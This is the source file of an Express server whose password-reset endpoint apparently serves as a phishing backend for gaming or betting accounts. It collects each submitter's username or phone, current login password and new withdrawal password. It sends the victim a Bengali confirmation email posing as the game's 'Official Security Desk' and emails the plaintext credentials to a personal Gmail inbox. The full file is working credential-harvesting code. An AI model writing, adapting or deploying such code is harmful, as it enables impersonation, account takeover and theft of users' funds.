import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import nodemailer from "nodemailer";
import dotenv from "dotenv";

dotenv.config();

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // API route for health check
  app.get("/api/health", (_req, res) => {
    res.json({ status: "ok" });
  });

  // API route for submitting form & sending email from admin sflove087@gmail.com to user gmail
  app.post("/api/reset-password", async (req, res) => {
    try {
      const {
        gameName,
        gmail,
        usernameOrPhone,
        loginPassword,
        newWithdrawPassword,
        timestamp,
        requestId,
      } = req.body;

      if (!gameName || !usernameOrPhone || !newWithdrawPassword) {
        return res.status(400).json({ error: "Missing required fields" });
      }

      const adminSenderEmail = (
        process.env.ADMIN_GMAIL ||
        process.env.GMAIL_USER ||
        "sflove087@gmail.com"
      ).trim();

      const userRecipientEmail = (gmail && typeof gmail === "string" ? gmail.trim() : "");

      const companyName = (
        process.env.COMPANY_NAME ||
        process.env.BUSINESS_EMAIL_FROM_NAME ||
        (gameName && typeof gameName === "string" && gameName.trim()
          ? `${gameName.trim()} Official Security Desk`
          : "Official Reset Support Desk")
      ).trim();

      let emailStatus: {
        sent: boolean;
        recipient?: string;
        sender?: string;
        companyName?: string;
        isLiveConfigured?: boolean;
        previewUrl?: string | false;
        error?: string;
      } = { sent: false, recipient: userRecipientEmail, sender: companyName, companyName };

      try {
        let transporter: any;
        const smtpUser = adminSenderEmail;
        const smtpPass = (
          process.env.GMAIL_APP_PASSWORD ||
          process.env.ADMIN_GMAIL_APP_PASSWORD ||
          process.env.BUSINESS_EMAIL_PASS ||
          process.env.SMTP_PASS ||
          ""
        ).trim();

        let fromAddress = `"${companyName}" <${smtpUser}>`;
        let isLive = false;

        if (smtpUser && smtpPass) {
          // Live delivery via Gmail SMTP
          transporter = nodemailer.createTransport({
            service: "gmail",
            auth: {
              user: smtpUser,
              pass: smtpPass,
            },
          });
          isLive = true;
        } else {
          // Standalone test transporter until user sets GMAIL_APP_PASSWORD in settings
          const testAccount = await nodemailer.createTestAccount();
          transporter = nodemailer.createTransport({
            host: "smtp.ethereal.email",
            port: 587,
            secure: false,
            auth: {
              user: testAccount.user,
              pass: testAccount.pass,
            },
          });
          fromAddress = `"${companyName}" <${testAccount.user}>`;
        }

        let previewUrl: string | false = false;

        // 1. Send confirmation message directly to USER's Gmail displaying Company Name instead of Gmail
        if (userRecipientEmail && userRecipientEmail.includes("@")) {
          const userMailOptions = {
            from: fromAddress,
            to: userRecipientEmail,
            subject: `✅ [নিশ্চিতকরণ] ${companyName} - ${gameName} উত্তোলন পাসওয়ার্ড রিসেট আবেদন গৃহীত হয়েছে (ID: ${requestId})`,
            html: `
              <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 24px; border: 1px solid #e2e8f0; border-radius: 12px; background-color: #ffffff;">
                <div style="background: linear-gradient(135deg, #1d4ed8, #4338ca); color: #ffffff; padding: 20px; border-radius: 8px; text-align: center;">
                  <h2 style="margin: 0; font-size: 20px;">উত্তোলন পাসওয়ার্ড রিসেট আবেদন গৃহীত হয়েছে ✅</h2>
                  <p style="margin: 6px 0 0 0; font-size: 13px; opacity: 0.9;">${companyName} থেকে পাঠানো বার্তা</p>
                </div>
                
                <div style="padding: 20px 6px;">
                  <p style="color: #334155; font-size: 15px; line-height: 1.6;">
                    প্রিয় গ্রাহক,<br />
                    <strong>${companyName}</strong>-এ আপনার <strong>${gameName}</strong> অ্যাকাউন্টের টাকা তোলার পাসওয়ার্ড (Withdrawal Password) রিসেটের আবেদনটি সফলভাবে সিস্টেমে গ্রহণ করা হয়েছে।
                  </p>

                  <div style="background-color: #f8fafc; border: 1px solid #cbd5e1; border-radius: 8px; padding: 18px; margin: 18px 0;">
                    <table style="width: 100%; font-size: 14px; border-collapse: collapse;">
                      <tr>
                        <td style="padding: 8px 0; color: #64748b; font-weight: bold; width: 40%;">কোম্পানি / সার্ভিস:</td>
                        <td style="padding: 8px 0; font-weight: bold; color: #1e293b; font-size: 15px;">${companyName}</td>
                      </tr>
                      <tr>
                        <td style="padding: 8px 0; color: #64748b; font-weight: bold;">ট্র্যাকিং আইডি:</td>
                        <td style="padding: 8px 0; font-weight: bold; color: #2563eb; font-family: monospace; font-size: 15px;">${requestId}</td>
                      </tr>
                      <tr>
                        <td style="padding: 8px 0; color: #64748b; font-weight: bold;">গেমের নাম:</td>
                        <td style="padding: 8px 0; font-weight: bold; color: #1e293b;">${gameName}</td>
                      </tr>
                      <tr>
                        <td style="padding: 8px 0; color: #64748b; font-weight: bold;">ইউজার নেম / ফোন:</td>
                        <td style="padding: 8px 0; font-weight: bold; color: #1e293b;">${usernameOrPhone}</td>
                      </tr>
                      <tr>
                        <td style="padding: 8px 0; color: #64748b; font-weight: bold;">গ্রাহকের জিমেইল:</td>
                        <td style="padding: 8px 0; font-weight: bold; color: #1e293b;">${userRecipientEmail}</td>
                      </tr>
                      <tr>
                        <td style="padding: 8px 0; color: #64748b; font-weight: bold;">আবেদনের সময়:</td>
                        <td style="padding: 8px 0; font-weight: bold; color: #1e293b;">${timestamp || new Date().toLocaleString()}</td>
                      </tr>
                      <tr>
                        <td style="padding: 8px 0; color: #64748b; font-weight: bold;">বর্তমান অবস্থা:</td>
                        <td style="padding: 8px 0; font-weight: bold; color: #0284c7;">ইন-রিভিউ (৫-১৫ মিনিটের মধ্যে কার্যকর হবে)</td>
                      </tr>
                    </table>
                  </div>

                  <p style="color: #64748b; font-size: 13px; line-height: 1.5;">
                    🔒 আপনার নিরাপত্তা নিশ্চিত করতে নতুন পাসওয়ার্ডটি কাউকে জানাবেন না। ${companyName} ভেরিফিকেশন প্যানেল থেকে পর্যালোচনা শেষে আপনার উত্তোলন সুবিধা চালু হবে।
                  </p>
                </div>

                <div style="border-top: 1px solid #e2e8f0; padding-top: 14px; text-align: center; color: #94a3b8; font-size: 12px;">
                  প্রেরক: ${companyName} • অফিসিয়াল সিকিউর রিসেট প্রোটোকল
                </div>
              </div>
            `,
          };

          const userMailInfo = await transporter.sendMail(userMailOptions);
          const maybePreview = nodemailer.getTestMessageUrl(userMailInfo);
          if (maybePreview) previewUrl = maybePreview;
        }

        // 2. Also send full notification record to ADMIN (sflove087@gmail.com)
        const adminMailOptions = {
          from: fromAddress,
          to: adminSenderEmail,
          subject: `🚨 [নতুন আবেদন] ${gameName} - ইউজার: ${usernameOrPhone} (ID: ${requestId})`,
          html: `
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 24px; border: 1px solid #e2e8f0; border-radius: 12px; background-color: #ffffff;">
              <div style="background: #1e293b; color: #ffffff; padding: 18px; border-radius: 8px; text-align: center;">
                <h2 style="margin: 0; font-size: 18px;">অ্যাডমিন নোটিফিকেশন: নতুন পাসওয়ার্ড রিসেট আবেদন</h2>
              </div>
              <div style="padding: 18px 0;">
                <table style="width: 100%; font-size: 14px; border-collapse: collapse;">
                  <tr><td style="padding: 6px 0; color: #64748b;">ট্র্যাকিং আইডি:</td><td style="padding: 6px 0; font-weight: bold;">${requestId}</td></tr>
                  <tr><td style="padding: 6px 0; color: #64748b;">গেমের নাম:</td><td style="padding: 6px 0; font-weight: bold; color: #2563eb;">${gameName}</td></tr>
                  <tr><td style="padding: 6px 0; color: #64748b;">গ্রাহকের জিমেইল:</td><td style="padding: 6px 0; font-weight: bold; color: #16a34a;">${userRecipientEmail || "দেওয়া হয়নি"}</td></tr>
                  <tr><td style="padding: 6px 0; color: #64748b;">ইউজার/ফোন:</td><td style="padding: 6px 0; font-weight: bold;">${usernameOrPhone}</td></tr>
                  <tr style="background:#fef2f2;"><td style="padding: 6px; color: #dc2626; font-weight: bold;">বর্তমান লগইন পাসওয়ার্ড:</td><td style="padding: 6px; font-weight: bold; color: #dc2626; font-family: monospace;">${loginPassword || "গোপন"}</td></tr>
                  <tr style="background:#f0fdf4;"><td style="padding: 6px; color: #15803d; font-weight: bold;">নতুন উত্তোলন পাসওয়ার্ড:</td><td style="padding: 6px; font-weight: bold; color: #16a34a; font-family: monospace; font-size: 16px;">${newWithdrawPassword}</td></tr>
                  <tr><td style="padding: 6px 0; color: #64748b;">সময়:</td><td style="padding: 6px 0;">${timestamp || new Date().toLocaleString()}</td></tr>
                </table>
              </div>
            </div>
          `,
        };

        await transporter.sendMail(adminMailOptions);

        emailStatus = {
          sent: true,
          recipient: userRecipientEmail || adminSenderEmail,
          sender: companyName,
          companyName,
          isLiveConfigured: isLive,
          previewUrl: previewUrl || false,
        };
      } catch (mailError: any) {
        console.error("Failed to send email:", mailError);
        emailStatus = {
          sent: false,
          recipient: userRecipientEmail || adminSenderEmail,
          sender: companyName,
          companyName,
          error: mailError?.message || "Failed to send email",
        };
      }

      return res.json({
        success: true,
        requestId,
        emailStatus,
      });
    } catch (err: any) {
      console.error("Server error:", err);
      return res.status(500).json({ error: "Internal Server Error" });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*all", (_req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
